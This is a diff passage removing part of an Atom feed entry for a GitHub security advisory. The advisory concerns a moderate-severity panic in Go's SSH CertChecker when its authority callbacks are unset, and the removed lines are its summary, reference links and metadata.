-        <link href="https://github.com/advisories/GHSA-78mq-xcr3-xm33"/>
-        <updated>2026-07-08T15:31:31.000Z</updated>
-        <content type="html"><![CDATA[<p>SSH servers which use CertChecker as a public key callback without setting IsUserAuthority or IsHostAuthority could be caused to panic by a client presenting a certificate. CertChecker now returns an error instead of panicking when these callbacks are nil.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39835">https://nvd.nist.gov/vuln/detail/CVE-2026-39835</a></li>
-<li><a href="https://go.dev/cl/781660">https://go.dev/cl/781660</a></li>
-<li><a href="https://go.dev/issue/79563">https://go.dev/issue/79563</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5015">https://pkg.go.dev/vuln/GO-2026-5015</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-39835">https://access.redhat.com/security/cve/CVE-2026-39835</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2480680">https://bugzilla.redhat.com/show_bug.cgi?id=2480680</a></li>
-<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39835.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39835.json</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:26546">https://access.redhat.com/errata/RHSA-2026:26546</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:26547">https://access.redhat.com/errata/RHSA-2026:26547</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:36199">https://access.redhat.com/errata/RHSA-2026:36199</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:36207">https://access.redhat.com/errata/RHSA-2026:36207</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:36319">https://access.redhat.com/errata/RHSA-2026:36319</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:36625">https://access.redhat.com/errata/RHSA-2026:36625</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:36648">https://access.redhat.com/errata/RHSA-2026:36648</a></li>
-<li><a href="https://github.com/advisories/GHSA-78mq-xcr3-xm33">https://github.com/advisories/GHSA-78mq-xcr3-xm33</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-78mq-xcr3-xm33</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-25T22:15:17.000Z</published>
     </entry>
 </feed>
